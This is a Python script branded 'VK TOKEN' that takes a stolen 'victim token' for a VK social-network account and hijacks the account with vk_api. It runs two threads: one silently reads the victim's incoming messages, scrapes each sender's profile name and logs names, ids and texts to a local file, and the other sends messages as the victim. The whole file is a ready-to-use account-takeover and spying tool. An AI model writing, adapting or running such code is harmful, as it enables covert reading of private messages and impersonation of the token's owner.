from colorama import Fore, Back, Style
import os
import vk_api  # pip install vk_api
import random
import time
import string
import threading
from bs4 import BeautifulSoup  # pip install beautifulsoup4
import requests  # pip install requests
from fake_useragent import UserAgent  # pip install fake_useragent
from vk_api.longpoll import VkLongPoll
from vk_api.longpoll import VkEventType

banner = """
██╗   ██╗██╗  ██╗    ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗
██║   ██║██║ ██╔╝    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║
██║   ██║█████╔╝        ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║
╚██╗ ██╔╝██╔═██╗        ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║
 ╚████╔╝ ██║  ██╗       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║
  ╚═══╝  ╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
	"""

print(Fore.GREEN + banner)

def send(p):
    try:
        my_token = p
        vk_session = vk_api.VkApi(token=my_token)
        vk = vk_session.get_api()

        f = input("Recipient id: ")  # id получателя

        while True:
            g = str(input("Text: "))  # введи техт который должен получить.

            length = 9

            letters_and_digits = string.digits
            rand_string = ''.join(random.sample(letters_and_digits, length))
            h = rand_string

            def send(f, g, h):
                vk.messages.send(user_id=f, message=g, random_id=h)
            send(f, g, h)
            print('+')
            print("\nWrite to another: -/+")
            a = input(": ")
            if a == '-':
                pass
            elif a == '+':
                f = input("Recipient id: ")  # id получателя
            else:
                pass
    except vk_api.exceptions.ApiError:
        print('sorry')

def message(p):
    try:
        print("Message...")
        my_token = p

        vk_session = vk_api.VkApi(token=my_token)
        longpoll = VkLongPoll(vk_session)
        vk = vk_session.get_api()

        for event in longpoll.listen():
            if event.type == VkEventType.MESSAGE_NEW:

                msg = event.text.lower()
                id = event.user_id

                def parse():
                    user = UserAgent()
                    URL = ("https://vk.com/id{}".format(id))
                    HEADERS = {
                        'User-Agent': user.random
                    }
                    response = requests.get(URL, headers=HEADERS)
                    soup = BeautifulSoup(response.content, 'html.parser')
                    items = soup.findAll('div', class_='scroll_fix_wrap _page_wrap')
                    comps = []
                    for items in items:
                        comps.append({
                            'title': items.find('h1', class_='page_name').get_text(strip=True)
                            })
                        for comp in comps:
                            print(comp["title"], 'id:', id)
                            my_file = open("File.txt", "a+")
                            my_file.write("{}".format(comp["title"]))
                            my_file.close()

                parse()
                print(msg)
                my_file = open("File.txt", "a+")
                my_file.write("id: {}\n".format(id))
                my_file.write("{}\n".format(msg))
                my_file.close()
    except:
        print('sorry')

print(" 1 > Start;")
print(" 2 > Exit;")

a = input(": ")

if a == '1':
    print("\nEnter victim token.")
    p = input(": ")
    
    receive_thread = threading.Thread(target=message, args=(p,))
    receive_thread.start()

    write_thread = threading.Thread(target=send, args=(p,))
    write_thread.start()

else:
    pass